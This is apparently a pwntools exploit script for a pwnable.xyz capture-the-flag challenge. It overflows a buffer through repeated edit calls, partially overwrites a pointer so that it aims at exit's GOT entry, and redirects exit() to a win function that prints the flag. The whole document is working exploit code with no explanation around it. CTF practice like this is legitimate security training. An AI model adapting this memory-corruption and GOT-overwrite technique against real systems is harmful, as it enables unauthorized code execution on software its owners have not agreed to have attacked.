from pwn import *

###Util
def edit(cnt,target,data):
    r.sendlineafter('> ','1')
    size = int(r.recvuntil(' chars: ',drop=True).split(b' ')[-1])
    if size==0:
        return 0,cnt
    if cnt+size<=target:
        r.send(b'a'*size)
    else:
        offset = 0
        padding = b''
        if cnt>target:
            offset = cnt-target
        else:
            padding = b'a'*(target-cnt)
        padding = b'a'*(target-cnt)
        if cnt+size>=target+3:
            payload = data[offset:]
        else:
            payload = data[offset:target+3-cnt-size]
        print(padding+payload)
        r.send(padding+payload)
    return (cnt+size>=target+3),cnt+size

def create():
    r.sendlineafter('> ','2')
    size = int(r.recvuntil(' chars: ',drop=True).split(b' ')[-1])
    if size<3:
        exit()
    r.send(p64(win))
    return 3

def save():
    r.sendlineafter('> ','4')
    r.sendlineafter('message? ','3')

###Addr
exit_got = 0x6020a0
win = 0x400b2d

###Exploit
###Too lazy to deal with case where initial write<3 bytes, just retry when it happens
while True:
    try:
        r = remote('svc.pwnable.xyz',30022)
        cnt = create()
        data = p64(exit_got)[:3]
        while True:
            res,cnt = edit(cnt,0x400,data)
            print(hex(cnt))
            if res==1:
                break
        save()
        ###Wait for alarm to trigger exit() to get flag
        r.interactive()
        break
    except:
        r.close()
